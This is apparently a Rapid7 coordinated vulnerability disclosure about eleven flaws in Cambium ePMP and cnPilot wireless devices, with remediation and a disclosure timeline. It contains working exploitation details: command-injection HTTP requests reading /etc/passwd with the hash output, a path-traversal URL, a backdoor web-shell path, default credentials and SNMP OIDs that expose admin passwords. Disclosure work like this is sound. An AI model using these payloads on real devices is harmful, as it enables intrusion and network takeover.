Note that, for the purposes of CVSS scoring, it is assumed that an attacker would need to be in an “adjacent network” -- in this case, the WiFi network that the affected device responsible for. However, some thousands of devices have been identified as reachable, in some way, over the internet (see the next section for those details).

## Product Description

Cambium’s ePMP 1000, 2000, and Force products provide wireless broadband access to endpoints, usually across large service areas suitable for both metropolitan and rural installations. Cambium’s cnPilot R190, R200, and R201 models of home and small business WiFi access points offer feature sets suitable for most small business and home office installations. More information can be found at the vendor’s product websites for the [ePMP 1000](http://www.cambiumnetworks.com/products/access/epmp-1000/) and [cnPilot](http://www.cambiumnetworks.com/products/wifi/cnpilot-home-small-business/) products.

These issues were identified in the available firmware for each of the respective devices. The versions tested for the ePMP line of devices were all in the 3.x series (the most recent of which was 3.5-RC4), the 2.6.x line, the 2.5.x line, and the 2.4.x line. For the cnPilot devices, firmware versions 4.3.2, 4.3.1, 4.2.3, 4.2.2, and 4.2 were all tested, the latest of which was 4.3.2-R4. All issues identified here affect at least these latest versions of the firmware (prior to vendor contact), and some issues were confirmed in some earlier versions.

In a recent study of the default HTTP and HTTPS ports on the public internet, [Rapid7’s Project Sonar](https://sonar.labs.rapid7.com/) discovered over 36,000 devices that responded with server headers or HTML titles indicative of Cambium’s ePMP product, but only 133 for their cnPilot product. The global distribution of these likely internet-reachable ePMP devices (as of November 21, 2017) is represented in the table below, limited to those countries with at least 100 exposed ePMP devices:

| Device Count | Country |
| --- | --- |
| 9619 | Serbia |
| 8267 | United States |
| 5021 | Italy |
| 3008 | Brazil |
| 2709 | Spain |
| 2507 | Colombia |
| 1175 | South Africa |
| 669 | Argentina |
| 423 | Russian Federation |
| 319 | Poland |
| 296 | Ukraine |
| 182 | Norway |
| 168 | India |
| 157 | Nigeria |
| 156 | Canada |

Examining the same dataset by looking at the organizations registered as owning the affected IP addresses, a pattern emerges that suggests that most of the affected devices are deployed in locations where Internet access is harder come by, and thus, depends on long-range wireless and other solutions. This seems to align with the general markets in which Cambium’s products might typically be deployed. Quoting from [the vendor](https://www.cambiumnetworks.com/our-company/):

> “Through its extensive portfolio of reliable, scalable and secure WiFi, fixed wireless broadband point-to-point (PTP) and point-to-multipoint (PMP) platforms; managed by cloud-based software, Cambium Networks makes it possible for service providers; enterprises; governmental and military agencies; oil, gas and utility companies; Internet service providers; and public safety networks to build powerful communications networks, reach users from 200 kilometers across mountain tops down to the last meter to their devices and intelligently manage their infrastructure through end-to-end network visibility and actionable analytics.”

It’s important to note that this Sonar study cannot make a determination if the discovered devices are actually affected by these vulnerabilities, since we do not attempt to log in to the discovered endpoints or pull firmware version information. This study merely shows that while the typical and suggested implementation of these devices should not expose a management interface to the internet, it’s clear that many are indeed exposed.

## Credit

These issues were reported to Rapid7 by independent researcher [Karn Ganeshen](https://ipositivesecurity.com/) (Twitter: [@juushya](https://twitter.com/juushya)).

## Vulnerability Details

There are 11 vulnerabilities described in this disclosure. Each vulnerability is discussed individually, along with any remediation strategies available for that issue. These issues are ordered first by product, then by approximate relative severity.

### R7-2017-25.1: ePMP privilege escalation via client-side protection bypass

Cambium ePMP devices ship with the following default login credentials: `admin`, `installer`, `home`, and `readonly`. Each of these accounts has a password that is identical to the username by default. By design, `admin` can change account passwords for any other user. However, it was found that the non-administrative users `installer` and `home` can also change passwords for other accounts, including `admin`; the `readonly` account does not have this power.

By using a normal browser and editing the shipped HTML, it is possible to disable the client-side protections that would otherwise prevent these users from changing the admin user’s password.

#### Exploitation and Impact for R7-2017-25.1

The following procedure can be used to effectively bypass the client-side controls:

1. Log in to the web-based administrative console as either `installer` or `home`, and navigate to the Account Management section.

   ![](https://blog.rapid7.com/content/images/2017/12/01-account-management.jpg)
2. Select the password field for `admin`, right click, and select “Inspect Element.”

   ![](https://blog.rapid7.com/content/images/2017/12/02-inspect-element.jpg)
3. Delete the element property `disabled=””` in the input tag, and see that the field is now editable.

   ![](https://blog.rapid7.com/content/images/2017/12/03-editable-password.jpg)
4. Create a new password, and save the updated configuration.

   ![](https://blog.rapid7.com/content/images/2017/12/04-saved-notification.jpg)

A successful exploitation would result in an attacker with a low-privileged user account gaining access to `admin`, with which the attacker can effectively control both the device itself and the entire WiFi network being served by this device.

#### Remediation for R7-2017-25.1

Update ePMP firmware with the vendor-supplied update to version 3.5.1 or later. Absent a patch, end users of the device should be careful with whom they share any user account credentials, since any user other than `readonly` can effectively seize administrator-level privileges.

### R7-2017-25.2: ePMP privilege escalation via command injection

Due to a lack of input sanitation for certain parameters on the web management console, any authenticated user (including the otherwise low-privilege `readonly` user) can inject shell meta-characters as part of a specially-crafted POST request to the `get_chart` function and run OS-level commands, effectively as root.

Exploitation and Impact for R7-2017-25.2

The vulnerable URL is: /cgi-bin/luci/;stok=/admin/get\_chart, and the vulnerable parameters are `measure` and `timestamp`, as seen in the captured HTTP requests and responses below:

Request

```
POST /cgi-bin/luci/;stok=319eaf4a919307b1f0d1904661eb724a/admin/get_chart HTTP/1.1
Host: 192.168.0.2
Content-Length: 126
Accept: */*
Origin: http://192.168.0.2
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101
Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://192.168.0.2/
Accept-Language: en-US,en;q=0.8
Cookie: sysauth_192.168.0.2_80=756d4ec028ee353f8f7ce05f993ae713; usernameType_80=admin;
stok_80=319eaf4a919307b1f0d1904661eb724a;
globalParams_80=%7B%22admin%22%3A%7B%22refresh_rate%22%3A20000%7D%7D
Connection: close
measure=s&timestamp=1|cat+/etc/passwd&debug=0

```

Response

```
HTTP/1.1 200 OK
Server: nginx/1.8.0
Date: Tue, 01 Sep 2015 02:09:12 GMT
Content-Type: application/json
Connection: close
Expires: 0
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Content-Length: 605
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
admin:$1$61wsPi9Q$yLMVI/JBgEClTzitFyGbg/:1000:4:admin:/tmp:/usr/bin/clish
installer:$1$yHIXrXnB$tr/Na771wSO4/dv8yCvmU/:2000:100:installer:/tmp:/bin/false
home:$1$/Bv9wvkq$5lBZqqsoAJj4uYOhb7pOS0:3000:100:home:/tmp:/bin/false
readonly:$1$zn4/PlCl$1qP9PGmPChDwkDAgp5Qgw0:4000:100:readonly:/tmp:/bin/false
dashboard:$1$Y9oz6eRg$ysokBk9VZCGo4AN6WQgVF0:5000:100:dashboard:/tmp:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
root:$1$7ZexQkRn$..OzaOi2qq2CyIkRI5hWs/:0:0:root:/root:/bin/ash

```

Other strategies for command execution are available to attackers, as well. For example, this sequence shows that backticks (translated as `%60`) are interpreted as well:

Request

```
POST /cgi-bin/luci/;stok=319eaf4a919307b1f0d1904661eb724a/admin/get_chart HTTP/1.1
Host: 192.168.0.2
Content-Length: 32
Accept: */*
Origin: http://192.168.0.2
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101
Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://192.168.0.2/
Accept-Language: en-US,en;q=0.8
Cookie: sysauth_192.168.0.2_80=756d4ec028ee353f8f7ce05f993ae713; usernameType_80=admin;
stok_80=319eaf4a919307b1f0d1904661eb724a;
globalParams_80=%7B%22admin%22%3A%7B%22refresh_rate%22%3A20000%7D%7D
Connection: close
measure=%60sleep%2011%60&debug=0

```

After approximately 11 seconds (the amount of time specified by the `sleep` command), the following response is returned:

Response

```
HTTP/1.1 200 OK
Server: nginx/1.8.0
Date: Tue, 01 Sep 2015 02:05:07 GMT
Content-Type: application/json
Connection: close
Expires: 0
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Content-Length: 24

Error executing command

```

A successful exploitation would result in an attacker with a low-privileged user account gaining access to `admin`, with which the attacker can effectively control both the device itself and the entire WiFi network being served by this device.

#### Remediation for R7-2017-25.2

Update ePMP firmware with the vendor-supplied update to version 3.5.1 or later. Absent a patch, end users of the device should be careful with whom they share any user account credentials, since any user other than `readonly` can effectively seize administrator-level privileges.

### R7-2017-25.3: ePMP privilege escalation via XSS

All authenticated users have the ability to update the Device Name and System Description fields in the web administration console, and those fields are vulnerable to persistent cross-site scripting (XSS) injection.

#### Exploitation for R7-2017-25.3

In the case of the installer user, these fields are editable directly in the System Configuration panel of the console, with no additional special action needed. In the case of the `home` and `readonly` users, the `disabled=””` element tag will need to be removed, similar to the procedure described in R7-2017-25.1, “ePMP privilege escalation via client-side protection bypass.” An example screenshot is shown below.

![](https://blog.rapid7.com/content/images/2017/12/05-system-description-xss.jpg)

Once the changes are saved, the script will trigger on the device’s home page, as shown below:

![](https://blog.rapid7.com/content/images/2017/12/06-system-description-xss-triggered.jpg)

Scripts supplied for System Description will execute in both pre- and post-authentication contexts, while scripts supplied for Device Name will execute only after authentication. In either case, an attacker can then use this XSS vulnerability to perform the usual XSS-based attacks of session hijacking, browser hooking, or other privilege escalation activities.

A successful exploitation would result in an attacker with a low-privileged user account gaining access to the browser sessions of subsequent users, including `admin`, with which the attacker can effectively control both the device itself and the entire WiFi network being served by this device.

#### Remediation for R7-2017-25.3

Update ePMP firmware with the vendor-supplied update to version 3.5.1 or later. Absent a patch, end users of the device should be careful with whom they share any user account credentials, since any user other than `readonly` can effectively seize administrator-level privileges.

### R7-2017-25.4: ePMP privilege escalation via XSS via SNMP OIDs using RW access

Similar to “R7-2017-25.3: ePMP privilege escalation via XSS,” an attacker who knows (or guesses) the SNMP read/write (RW) community string can insert XSS strings in certain SNMP OIDs which will execute in the context of the currently-logged on user. Once an administrator logs in, the attacker can effectively gain full administrative access via session hijacking or browser hooking.

#### Exploitation and Impact for R7-2017-25.4

The vulnerable OIDs that fail to sanitize user-supplied input are [snmpSystemDescription](http://support.cambiumnetworks.com/framed/onlinetools/content.CAMBIUM-PMP80211-MIB.html#snmpSystemDescription) and [systemConfigDeviceName](http://support.cambiumnetworks.com/framed/onlinetools/content.CAMBIUM-PMP80211-MIB.html#systemConfigDeviceName). Once the script has been injected, the attacker can then apply the modified values to the device’s configuration. This can be achieved by using the OID [cambiumpmp80211ConfigurationApply](http://support.cambiumnetworks.com/framed/onlinetools/content.CAMBIUM-PMP80211-MIB.html#cambiumpmp80211ConfigurationApply).

An attacker with knowledge of the SNMP RW string can execute this attack using the standard `snmpget` SNMP administration tool, as demonstrated below.

![](https://blog.rapid7.com/content/images/2017/12/07-snmpsystemdescription-xss.jpg)

Note that the versions of SNMP supported by the ePMP devices do not support encryption or authentication between SNMP nodes, so an attacker on the same network as the ePMP device can learn the private community string through typical man-in-the-middle (MITM) and spoofing tactics, as well as by more straightforward bruteforcing techniques.

A successful exploitation would result in an attacker with a low-privileged user account gaining access to the browser sessions of subsequent users, including `admin`, with which the attacker can effectively control both the device itself and the entire WiFi network being served by this device.

### Remediation for R7-2017-25.4

Update ePMP firmware with the vendor-supplied update to version 3.5.1 or later. Absent a patch, changing the default RW community string to a reasonably strong password will somewhat mitigate this attack vector. Ideally, a vendor-supplied update would include a mechanism to provide access controls via ACLs to block unauthorized and unknown endpoints from accessing the device at all. However, due to the lack of encryption provided by SNMPv1 and v2, combined with the spoofability of UDP connections, in order to completely mitigate this attack vector users must disable SNMP-based management entirely. This recommendation is more of an indictment of SNMPv1 and v2, though, and not specific to these devices. For more on SNMP-based security concerns, see [US-CERT alert TA17-156A](https://www.us-cert.gov/ncas/alerts/TA17-156A).

### R7-2017-25.5: ePMP privilege escalation via XSS via SNMP configuration upload using RW access

Similar to “R7-2017-25.4: ePMP privilege escalation via XSS via SNMP OIDs using RW access,” an attacker who knows or can guess the RW community string can provide a URL for a configuration file over SNMP, serve it via HTTP, and the affected device will perform a configuration restore using the attacker’s supplied config file.

#### Exploitation and Impact for R7-2017-25.5

The relevant OIDs for this vector are [cambiumJSONCfgImport](http://support.cambiumnetworks.com/framed/onlinetools/content.CAMBIUM-PMP80211-MIB.html#cambiumJSONCfgImport), [cambiumJSONCfgImportError](http://support.cambiumnetworks.com/framed/onlinetools/content.CAMBIUM-PMP80211-MIB.html#cambiumJSONCfgImportError), and [cambiumJSONCfgImportStatus](http://support.cambiumnetworks.com/framed/onlinetools/content.CAMBIUM-PMP80211-MIB.html#cambiumJSONCfgImportStatus).

The following describes a sample attacker-modified configuration file:

![](https://blog.rapid7.com/content/images/2017/12/09-json-config-1.jpg)

Using snmpget, the attacker then provides a URL where this config file is hosted:

![](https://blog.rapid7.com/content/images/2017/12/10-snmp-config-url.jpg)

A successful exploitation would result in an attacker with a low-privileged user account gaining access to the browser sessions of subsequent users, including `admin`, with which the attacker can effectively control both the device itself and the entire WiFi network being served by this device.

#### Remediation for R7-2017-25.5

Update ePMP firmware with the vendor-supplied update to version 3.5.1 or later. Absent a patch, changing the default RW community string to a reasonably strong password will somewhat mitigate this attack vector. Due to the lack of encryption provided by SNMPv1 and v2, in order to completely mitigate this attack vector, users must disable SNMP-based management entirely.

### R7-2017-25.6: cnPilot privilege escalation via backdoor access

An undocumented, root-privilege administration web shell was discovered on the cnPilot.

#### Exploitation for R7-2017-25.6

By default, the device ships with three login credentials: admin/admin, useradmin/useradmin, and user/user. Once authenticated, all users have access to the web shell provided at `https://<device>/adm/syscmd.asp`. A screenshot of the web shell is provided below.

![](https://blog.rapid7.com/content/images/2017/12/11-cnpilot-backdoor.jpg)

#### Remediation for R7-2017-25.6

Update cnPilot firmware with the vendor-supplied update to version 4.4 or later. Absent a patch, end users of the device should be careful with whom they share any user account credentials, since any user can effectively seize root-level privileges.

### R7-2017-25.7: cnPilot privilege escalation via direct object reference

The device configuration file is stored in cleartext, and is accessible by the non-admin `user` account.

#### Exploitation and Impact for R7-2017-25.7

The device configuration stores usernames, passwords, email addresses, keys, SIP connection parameters, ACS parameters, and WiFi configuration details. While the option to access the configuration file is not available in the normal web administrative console for the user account, it is accessible via direct object reference (DRO) at `http://<device>/goform/down_cfg_file`.

A successful exploitation would result in an attacker with a low-privileged user account gaining access to the password for `admin`, with which the attacker can effectively control both the device itself and the entire WiFi network being served by this device, as well as potentially any corresponding authentication services configured for use in the affected network.

#### Remediation for R7-2017-25.7

Update cnPilot firmware with the vendor-supplied update to version 4.4 or later. Absent a vendor patch, users of the device should be careful to whom they give `user` level access.

### R7-2017-25.8: cnPilot critical information disclosure via file path traversal in Readfile

The “ping” and “traceroute” functions of the web administrative console expose a file path traversal vulnerability, accessible to all authenticated users.

#### Exploitation and Impact for R7-2017-25.8

In normal usage, when a ping test is run from the web console, the application submits two HTTP requests. First, a POST request is created which supplies the IP address of the ping or traceroute target, and the results of this are stored locally in a file called `pingresult` or `traceroutetest`. Next, a GET request is sent to read the contents of these files, which are exposed as part of a `Readfile` CGI script at `https://<device>/goform/logRead?Readfile=pingresult`.

The Readfile script, however, does not appear to sanitize user-supplied input. Given an authenticated session, it is possible, for example, to request `https://IP/goform/logRead?Readfile=../../../../../../../etc/passwd` and read this (and other) sensitive operating system files.

A successful exploitation would result in an attacker with a low-privileged user account gaining access to the password for `admin`, with which the attacker can effectively control both the device itself and the entire WiFi network being served by this device.

#### Remediation for R7-2017-25.8

Update cnPilot firmware with the vendor-supplied update to version 4.4 or later. Absent a vendor patch, users of the device should be careful to whom they give `user` level access.

### R7-2017-25.9: cnPilot privilege escalation via SNMP RO access to sensitive OIDs

The SNMP read-only (RO) community string has access to sensitive information by OID reference.

#### Exploitation and Impact for R7-2017-25.9

By requesting certain OIDs using `snmpget`, an attacker can learn all usernames and passwords, including that of the admin user. The OID for the Admin username is `1.3.6.1.4.1.41010.1.7.12.0`, and the admin password is stored at `1.3.6.1.4.1.41010.1.7.13.0`. In addition, many other configuration parameter values can be read by the RO community string, such as the WiFi pre-shared key.

A successful exploitation would result in an attacker with a low-privileged user account gaining access to the password for `admin`, with which the attacker can effectively control both the device itself and the entire WiFi network being served by this device.

#### Remediation for R7-2017-25.9

Update cnPilot firmware with the vendor-supplied update to version 4.4 or later. Absent a vendor patch, SNMP RO access should be disabled completely.

(Incidentally, these two OIDs do not appear to be published in the vendor’s documentation or on the vendor’s support portal.)

### R7-2017-25.10: cnPilot lack of CSRF controls

Cross-Site Request Forgery (CSRF) attacks involve an attacker tricking an already-logged-in user to perform actions on a website or web application in the privilege context of that user. Such attacks tend to come in the form of either links sent via email or text message, or forum posts on sites logged-in users are likely to visit (such a support forums, user groups, etc). cnPilot devices lack CSRF controls that can mitigate the effects of CSRF attacks, which are most typically implemented as randomized per-session tokens associated with any web application function, especially destructive ones.

#### Exploitation and Impact for R7-2017-25.10

A successful exploitation would result in an attacker on the local network gaining some control over a browser session for `admin`, with which the attacker can learn or change the administrator password, and subsequently effectively control both the device itself and the entire WiFi network being served by this device.

#### Remediation for R7-2017-25.10

A vendor supplied patch should effectively prevent CSRF attacks by appending a hidden anti-CSRF token with any potentially sensitive form action or AJAX request, and subsequently validating the correctness of that token when processing HTTP POST or GET requests. Absent a vendor patch, users should ensure they are completely logged out of the cnPilot device when using a web browser session for any other purpose. A common tactic is to perform administrative functions in a restricted browser context—such as Google Chrome’s Incognito Mode—which is sandboxed from normal web browsing.

### R7-2017-25.11: Shipping Suspicious Binaries

Static analysis of the firmware for the ePMP, ePMP 1000 Hotspot, and cnPilot revealed several suspicious binaries and associated function calls. While actual exploitability has yet to be determined, the following binaries and function calls were flagged as unsafe.

| Affected Product | Issue |
| --- | --- |
| ePMP 1000 Hotspot | JQuery version 2.1.4 |
| ePMP | /usr/sbin/nginx calls to SSLv23\_method |
| ePMP 1000 Hotspot | /usr/lib/libldap\_r-2.4.so.2.10.7 calls to SSLv23\_method |
| cnPilot | /usr/sbin/trfv calls to SSLv23\_method |
| cnPilot | /usr/sbin/provision calls to SSLv23\_method |
| ePMP | /usr/bin/device-agent lacks of certificate validation |
| ePMP | /usr/bin/s3upload lacks certificate validation |
| ePMP 1000 Hotspot | /usr/sbin/fw\_dl lacks certificate validation |
| ePMP 1000 Hotspot | /usr/sbin/wpa\_supplicant lacks certificate validation |
| ePMP 1000 Hotspot | /usr/sbin/s3upload lacks certificate validation |

#### Exploitation and Impact for R7-2017-25.11

Because these were found during static analysis, the underlying code paths to actually leverage these findings has yet to be determined. It’s entirely possible that the use of these libraries and functions do not actually represent a risk to the end users or their networks, but there is not enough evidence to demonstrate true risk either way.

#### Remediation for R7-2017-25.11

A vendor-supplied firmware update should include more recent versions of third-party, common libraries, and ensure that these libraries are being used in a safe and secure manner. In particular, the shipped version of JQuery should be updated to the latest supported version, SSL functions should employ the stronger TLS1\_method() function call, and in cases where verifying an SSL endpoint is important, all SSL functions should actually validate endpoint certificates.

## Vendor Statement

Cambium Networks was made aware of vulnerabilities in Cambium’s ePMP™ and cnPilot product lines that were discovered by an independent researcher who brought his findings to Rapid7. Demonstrating the company’s deep commitment to security, Cambium Networks conducted a comprehensive investigation to validate the research immediately upon learning of the vulnerabilities and took steps to address and fix the most critical issues as quickly as possible. At this time, each vulnerability has been resolved, and the product lines have been furthered secured. There were no compromises made on any customer network leveraging these vulnerabilities, and no customers were impacted. For more information, visit the Cambium Security Advisory at <http://www.cambiumnetworks.com/security>.

Cambium Networks is a leading global provider of wireless broadband solutions with a mission to connect the unconnected and provide complete coverage for everyone with flexible, available and scalable networks. Through its extensive portfolio of reliable, scalable and secure Wi-Fi, fixed wireless broadband point-to-point (PTP) and point-to-multipoint (PMP) platforms, managed by cloud-based software, Cambium Networks makes it possible for service providers; enterprises; governmental and military agencies; oil, gas and utility companies; internet service providers; and public safety networks to build powerful communications networks and intelligently manage their infrastructure through end-to-end network visibility and actionable analytics. The company currently has access and backhaul radios deployed in demanding networks in more than 150 countries.

## Disclosure Timeline

* Mon, Sep 25, 2017: Initial contact made to the vendor.
* Wed, Sep 28, 2017: Details provided to the vendor.
* Wed, Oct 11, 2017: Disclosed to CERT/CC as VU#928752
* Mon, Oct 16, 2017: Draft disclosure provided to the vendor
* Tue, Oct 24, 2017: Vendor provided status update and patch schedule
* Fri, Nov 10, 2017: Vendor provided [updated firmware](https://support.cambiumnetworks.com/login)
* Tue, Dec 19, 2017: Public disclosure and [Metasploit modules](https://github.com/rapid7/metasploit-framework/pull/9316) added to the pull request queue.

#### POST TAGS

* [Vulnerability Disclosure](/blog/tag/vulnerability-disclosure/ "Vulnerability Disclosure")
* [Third-Party Disclosure](/blog/tag/third-party-disclosure/ "Third-Party Disclosure")

#### SHARING IS CARING

#### AUTHOR

[Tod Beardsley](/blog/author/tod-beardsley/ "Tod Beardsley")

Director of Research at Rapid7, contributing author of several Rapid7 research papers, CVE Board member, and Metasploit collaborator. https://infosec.exchange/@todb

[View Tod's Posts](/blog/author/tod-beardsley/)

![](https://blog.rapid7.com/content/images/2017/12/cambium-banner.jpg)

## Topics

* [Metasploit
   *(664)*](/blog/tag/metasploit/)
* [Vulnerability Management
   *(368)*](/blog/tag/vulnerability-management/)
* [Research
   *(244)*](/blog/tag/research/)
* [Detection and Response
   *(208)*](/blog/tag/detection-and-response/)
* [Vulnerability Disclosure
   *(150)*](/blog/tag/vulnerability-disclosure/)
* [Emergent Threat Response
   *(146)*](/blog/tag/emergent-threat-response/)
* [Cloud Security
   *(137)*](/blog/tag/cloud-security/)
* [Security Operations
   *(21)*](/blog/tag/secops/)

## Popular Tags

* [Metasploit](/blog/tag/metasploit/)
* [Metasploit Weekly Wrapup](/blog/tag/metasploit-weekly-wrapup/)
* [Vulnerability Management](/blog/tag/vulnerability-management/)
* [Research](/blog/tag/research/)
* [Detection and Response](/blog/tag/detection-and-response/)
* [Logentries](/blog/tag/logentries/)

## Related Posts

Lorex 2K Indoor Wi-Fi Security Camera: Multiple Vulnerabilities (FIXED)

[Read More](/blog/post/2024/12/03/lorex-2k-indoor-wi-fi-security-camera-multiple-vulnerabilities-fixed/)

Multiple Vulnerabilities in Wowza Streaming Engine (Fixed)

[Read More](/blog/post/2024/11/20/multiple-vulnerabilities-in-wowza-streaming-engine-fixed/)

CVE-2024-45195: Apache OFBiz Unauthenticated Remote Code Execution (Fixed)

[Read More](/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/)

CVE-2024-6922: Automation Anywhere Automation 360 Server-Side Request Forgery

[Read More](/blog/post/2024/07/26/cve-2024-6922-automation-anywhere-automation-360-server-side-request-forgery/)

## Related Posts

[IoT

Lorex 2K Indoor Wi-Fi Security Camera: Multiple Vulnerabilities (FIXED)

Read Full Post](/blog/post/2024/12/03/lorex-2k-indoor-wi-fi-security-camera-multiple-vulnerabilities-fixed/)

[Vulnerability Disclosure

Multiple Vulnerabilities in Wowza Streaming Engine (Fixed)

Read Full Post](/blog/post/2024/11/20/multiple-vulnerabilities-in-wowza-streaming-engine-fixed/)

[Vulnerability Disclosure

CVE-2024-45195: Apache OFBiz Unauthenticated Remote Code Execution (Fixed)

Read Full Post](/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/)

[Vulnerability Disclosure

CVE-2024-6922: Automation Anywhere Automation 360 Server-Side Request Forgery

Read Full Post](/blog/post/2024/07/26/cve-2024-6922-automation-anywhere-automation-360-server-side-request-forgery/)

[View All Posts](/blog/posts/)

Search

[BACK TO TOP
![](/includes/img/up-arrow-lightgray.png?width=1200)](#__)

[![Rapid7 logo](/includes/img/Rapid7_logo.svg?width=1200&quality=90)](/)
CUSTOMER SUPPORT
+1-866-390-8113 (Toll Free)
SALES SUPPORT
+1-866-772-7437 (Toll Free)
Need to report an Escalation or a Breach?
[Get Help](/services/incident-response-customer-escalation/)

SOLUTIONS
[The Command Platform](/platform/)
[Exposure Command](/products/command/exposure-management/)
[Managed Threat Complete](/services/managed-detection-and-response-mdr/)

SUPPORT & RESOURCES
[Product Support](https://www.rapid7.com/for-customers/)
[Resource Library](https://www.rapid7.com/resources/)
[Our Customers](https://www.rapid7.com/customers/)
[Events & Webcasts](https://www.rapid7.com/about/events-webcasts/)
[Training & Certification](https://www.rapid7.com/services/training-certification/)
[Cybersecurity Fundamentals](https://www.rapid7.com/fundamentals/)
[Vulnerability & Exploit Database](https://www.rapid7.com/db/)

ABOUT US
[Company](https://www.rapid7.com/about/company/)
[Diversity, Equity, and Inclusion](https://www.rapid7.com/about/diversity-equity-and-inclusion/)
[Leadership](https://www.rapid7.com/about/leadership/)
[News & Press Releases](https://www.rapid7.com/about/news/)
[Public Policy](https://www.rapid7.com/about/public-policy/)
[Open Source](https://www.rapid7.com/open-source/)
[Investors](https://investors.rapid7.com/overview/default.aspx)

CONNECT WITH US
[Contact](https://www.rapid7.com/contact/)
[Blog](https://www.rapid7.com/blog/)
[Support Login](https://insight.rapid7.com/login)
[Careers](https://careers.rapid7.com/careers-home)

© Rapid7
[Legal Terms](/legal/)
  |   [Privacy Policy](/privacy-policy/)
  |   [Export Notice](/export-notice/)
  |   [Trust](/trust/)
  |   Do Not Sell or Share My Personal Information
  |   Cookie Preferences

Contact Us

## Submit your information and we will get in touch with you.

#### Thank you for contacting us.

##### We will be in touch shortly.

![Rapid7 logo](/includes/img/logo-black.png)

### General:

info@rapid7.com

### Sales:

+1-866-772-7437
sales@rapid7.com

### Support:

+1–866–390–8113 (toll free)
support@rapid7.com

### Incident Response:

1-844-727-4347

[More Contact Info](/contact/)

## Never miss a blog

Get the latest stories, expertise, and news about security today.

You’re almost done!
 Check your email to confirm your subscription.


